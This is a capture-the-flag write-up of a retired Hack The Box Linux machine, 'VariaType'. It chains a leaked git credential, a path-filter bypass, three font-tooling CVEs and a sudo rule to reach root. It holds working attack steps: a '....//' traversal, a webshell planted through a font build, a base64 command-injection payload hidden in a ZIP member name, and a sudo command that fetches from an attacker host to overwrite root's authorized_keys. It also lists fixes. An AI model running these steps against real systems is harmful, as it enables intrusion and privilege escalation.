# VariaType — Hack The Box (retired)

**Medium · Linux**

```
exposed .git → gitbot credential → single-pass "../" filter (....//) → file read
  → CVE-2025-66034 fontTools varLib arbitrary write → www-data
  → CVE-2024-25082 FontForge archive-member command injection → steve
  → CVE-2025-47273 setuptools PackageIndex traversal via a sudo wrapper → root
```

Two open ports, two web apps, and a chain that runs entirely through a font-build pipeline.
Every link is a published CVE except the two that matter most: a path filter that runs once,
and a `sudo` rule that ends in a wildcard.

Flag values redacted; machine and VPN addresses generalised.

---

## Recon

`nmap` returns only tcp/22 (OpenSSH 9.2p1 Debian) and tcp/80 (nginx 1.22.1). The raw IP 301s to
`variatype.htb`, which is the tell for virtual-host gating, so the hostname goes into `/etc/hosts`
and a `Host:` fuzz follows immediately. It finds one more: `portal.variatype.htb`.

`variatype.htb` is a Flask app — a "variable font generator" that accepts a `.designspace` file
(XML) plus one or more `.ttf`/`.otf` masters and, it claims, builds a variable font. The Flask
tell is the `session` cookie carrying flash messages, and the stock Werkzeug 404.

`portal.variatype.htb` is a PHP "Internal Validation Portal" behind a login.

## The generator is a façade

Worth doing before anything clever: use the app as intended, then look hard at the result. A
successful build returns `/download/<id>`, and the file it hands back is **byte-identical to the
uploaded master** — same md5, no `fvar` table. Whatever the pipeline does, the artifact you receive
is not a variable font. That is a strong hint that the interesting behaviour is a side effect of the
build, not its output.

Two other cheap observations from the same pass:

- Errors are uniform: `Font generation failed during processing.` and `Font generation timed out.`
  Two messages, no stack traces, no path leaks. Every oracle built later has to be behavioural.
- The build is slow (~20 s for a 657 KB master, ~1 s for a 42 KB one). Picking a small master makes
  every later experiment ten times cheaper — worth thirty seconds of setup.

## The portal: `.git`, then a credential

A content fuzz of the portal finds `/.git/` (403 on the directory, but `config` and `index` are
served). `git-dumper` recovers the repo. It contains exactly one tracked file, `auth.php`, and it is
empty of secrets — but the history is not:

```
753b5f5 fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

`git log -p` shows the credential added in one commit, and `git reflog` shows a third, dangling
commit titled *security: remove hardcoded credentials*. Removing a secret in a later commit does
nothing; the blob is still in the object store. That credential logs into the portal.

The dashboard lists the fonts produced by the generator, with `view.php?f=` and `download.php?f=`.

## The file read — and the mistake that cost hours

`view.php` rejects anything containing a slash. `download.php` looks similar, so it is easy to
write both off. It is not the same:

```php
$file = str_replace("../", "", $file);
$filepath = '/var/www/portal.variatype.htb/public/files/' . $file;
```

The substitution runs **once**, so `....//` becomes `../` *after* filtering. The classic bypass.

I tested that bypass early — at four levels of traversal — got `File not found.`, and marked the
whole parameter DEAD. The base directory is `/var/www/portal.variatype.htb/public/files`, which is
**five** levels below `/`. At depth 5 it reads `/etc/passwd` immediately:

```
depth 3 -> File not found.
depth 4 -> File not found.
depth 5 -> root:x:0:0:root:/root:/bin/bash …
```

One directory short. The lesson is not "try harder"; it is that a traversal probe must sweep depth
as a range, because a negative at a single depth is indistinguishable from a filter that works.
Reaching `/etc/passwd` is one request per depth; guessing where the app writes its output — which is
what I did instead — took roughly 1,500.

With the read, everything falls out: the nginx vhosts, `/opt/variatype/app.py`, the systemd unit,
`steve`'s cron script, and the sudo target's source.

## Foothold: CVE-2025-66034

`app.py` runs `fonttools varLib config.designspace` as a subprocess. The installed fontTools is
4.50.0, inside the 4.33.0–4.60.1 window of **CVE-2025-66034**: `varLib`'s `main()` takes the output
path straight from the designspace document.

```python
filename = vf.filename if vf.filename is not None else vf.name + ".{ext}"
vf_name_to_output_path[vf.name] = os.path.join(output_dir, filename)
...
vf.save(output_path)
```

`os.path.join` with an absolute second argument discards the first, so `<variable-font
filename="/absolute/path">` writes wherever the service account can. The second half of the CVE is
that `<labelname>` text is embedded verbatim in the produced font, so the file's bytes can carry a
chosen ASCII string. PHP does not care what surrounds `<?php … ?>`, so a font *is* a valid webshell.

The systemd unit says exactly where to aim:

```
User=variatype
ReadWritePaths=/var/www/portal.variatype.htb/public/files
ReadWritePaths=/opt/variatype
```

Two writable paths and one of them is served by nginx, which passes `.php` to FPM. Dropping a
webshell there gives execution as `www-data`.

**A note on why this was hard without the file read.** The service account is `variatype`, but
`/var/www/portal.variatype.htb` is not traversable by it — only the single
`ReadWritePaths` directory nested three levels inside is reachable, and it is invisible to
enumeration from the outside. I built a writability oracle out of the CVE (write succeeds → the
directory is writable) and a file-existence oracle out of the designspace `<source filename>` (the
build only completes if that path is a readable, parseable font), and swept `/var/www/*`, `/opt/*`,
`/srv/*`, `/tmp/*` and the app tree with a 239-word list. Every sweep missed, because the answer was
a three-component path (`portal.variatype.htb` + `public` + `files`) and I only ever generated
two-component candidates.

## Lateral movement: CVE-2024-25082

As `www-data`, `/opt/process_client_submissions.bak` is world-readable and describes a cron owned by
`steve`, running every two minutes over the same upload directory:

```bash
SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'
...
timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "…fontforge.open('$file')…"
```

The outer filename is validated. FontForge 20230101 is vulnerable to **CVE-2024-25082**: when
opening an archive, `splinefont` builds shell command strings from the names of the files *inside*
it, which nothing validates. So the payload is a ZIP whose outer name is boring and whose member
name is the injection:

```python
inner = "$(echo <base64-payload>|base64 -d|bash).ttf"
zipf.write("font.ttf", arcname=inner)
```

Two details make it work reliably. The base64 must contain no `/`, or the member becomes a
directory — pad the command with spaces until the encoding is clean. And rather than catching an
interactive shell, have the payload append an SSH key to `steve`'s `authorized_keys`; the cron fires
every two minutes and a key is stable where a reverse shell in a cron child is not.

`user.txt` is readable as `steve`.

## Root: CVE-2025-47273

```
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

The script fetches a "plugin" URL with `setuptools.package_index.PackageIndex.download()`. The
installed setuptools is 78.1.0; **CVE-2025-47273** (fixed in 78.1.1) is a path traversal in exactly
that call — the destination is `os.path.join(tmpdir, name)` where `name` is derived from the URL, so
a URL-encoded absolute path escapes the directory:

```
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
     http://10.10.14.x:8000/%2froot%2f.ssh%2fauthorized_keys
```

The one piece of tooling this needs is a web server that returns the same body for *any* path — the
payload lives in the URL path, so the file cannot exist under that name on the attacker side. Twenty
lines of `http.server` does it. Serve an SSH public key, run the command, `ssh root@target`.

## What failed, and why it is worth recording

- **XXE in the designspace.** The obvious first idea for an XML-consuming service. Internal entities
  expand, external `file://` entities error out — fontTools parses with expat via ElementTree, and
  lxml is not in play. Ruled out in two requests by comparing an internal entity against an external
  one; without that control the failure looks like "the payload is wrong".
- **Guessing the output directory.** ~1,500 write probes across five roots, plus a delayed re-check
  hours later in case a sync job was involved. All negative. The path was three components deep and
  my candidate generator only ever emitted two.
- **A flaky oracle producing false negatives.** The first version of the writability prober treated
  a *timeout* as "not writable". Under three concurrent workers timeouts were common, and it told me
  `/opt/variatype` contained only `app.py`. Adding timeout detection and a retry changed the answer
  to `app.py`, `config.py`, `settings.py`, `wsgi.py`, `gunicorn.conf.py`, `requirements.txt`, `.env`.
  Any oracle built on a service that can time out has to distinguish "no" from "no answer".
- **Over-parallelising against a small gunicorn pool.** Three sweepers saturated the app and every
  probe started timing out, which then degrades the box for anyone else on it. Sweeps are cheap only
  until they are not.

## Fixes

| Component | Version here | Fixed in |
|---|---|---|
| fontTools | 4.50.0 | 4.60.2 |
| FontForge | 20230101 | the 2024 `system()` → argv patch |
| setuptools | 78.1.0 | 78.1.1 |

Plus the two that are not CVEs and matter just as much: stop serving `.git`, and never sanitise a
path by substitution — resolve it and check that it is still inside the base directory.
